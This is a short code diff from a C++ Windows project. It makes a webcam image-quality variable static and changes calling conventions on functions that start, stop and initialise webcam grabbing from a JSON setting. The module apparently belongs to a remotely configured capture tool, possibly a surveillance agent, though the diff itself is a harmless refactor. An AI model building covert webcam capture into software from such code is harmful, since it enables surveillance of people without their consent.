@@ -15,9 +15,9 @@ extern void CameraGrab(DWORD quality);
 #define CAM_IMG_QUALITY_MED 50
 #define CAM_IMG_QUALITY_HI 100
 
-DWORD cam_image_quality = CAM_IMG_QUALITY_MED;
+static DWORD cam_image_quality = CAM_IMG_QUALITY_MED;
 
-DWORD __stdcall PM_WebCamStartStop(BOOL bStartFlag, BOOL bReset)
+DWORD WINAPI PM_WebCamStartStop(BOOL bStartFlag, BOOL bReset)
 {
 	if (bStartFlag && bReset) 
 		CameraGrab(cam_image_quality);
@@ -25,7 +25,7 @@ DWORD __stdcall PM_WebCamStartStop(BOOL bStartFlag, BOOL bReset)
 	return 1;
 }
 
-DWORD __stdcall PM_WebCamInit(JSONObject elem)
+DWORD WINAPI PM_WebCamInit(JSONObject elem)
 {
 	if (!wcscmp(elem[L"quality"]->AsString().c_str(), L"hi") ) {
 		cam_image_quality = CAM_IMG_QUALITY_HI; 
